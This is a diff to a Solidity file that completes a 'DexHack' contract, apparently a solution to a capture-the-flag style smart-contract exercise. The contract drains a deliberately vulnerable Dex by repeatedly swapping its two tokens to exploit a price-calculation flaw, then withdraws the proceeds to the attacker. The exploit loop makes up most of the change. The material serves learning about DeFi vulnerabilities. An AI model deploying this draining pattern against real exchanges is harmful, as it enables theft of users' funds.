@@ -5,8 +5,6 @@ import "openzeppelin-contracts/token/ERC20/IERC20.sol";
 import "openzeppelin-contracts/token/ERC20/ERC20.sol";
 import "openzeppelin-contracts/access/Ownable.sol";
 
-import "forge-std/console.sol";
-
 contract Dex is Ownable {
     address public token1;
     address public token2;
@@ -81,15 +79,44 @@ contract SwappableToken is ERC20 {
 
 contract DexHack {
     address owner;
-    Dex victim;
+    Dex dex;
 
-    constructor(address _victim) {
-      owner = msg.sender;
-      victim = Dex(_victim);
-    }    
+    SwappableToken token1;
+    SwappableToken token2;
 
-    function Hack() public {
-      // Just go back and forth and swap everything into one asset, you will get everything eventually
-      
+    constructor(address _victim, address _token1, address _token2) {
+        owner = msg.sender;
+        dex = Dex(_victim);
+
+        token1 = SwappableToken(_token1);
+        token2 = SwappableToken(_token2);
+    }
+
+    function withdraw() public {
+        require(msg.sender == owner, "Only the owner can withdraw");
+
+        token1.transfer(owner, token1.balanceOf(address(this)));
+        token2.transfer(owner, token2.balanceOf(address(this)));
+    }
+
+    function exploit() public {
+        dex.approve(address(dex), 100000 ether);
+
+        while (
+            token1.balanceOf(address(dex)) > 0 &&
+            token2.balanceOf(address(dex)) > 0
+        ) {
+            SwappableToken from;
+            SwappableToken to;
+            (from, to) = token1.balanceOf(address(this)) > 0
+                ? (token1, token2)
+                : (token2, token1);
+            uint swapAmount = from.balanceOf(address(this));
+            uint dexBalance = from.balanceOf(address(dex));
+            if (swapAmount > dexBalance) {
+                swapAmount = dexBalance;
+            }
+            dex.swap(address(from), address(to), swapAmount);
+        }
     }
 }
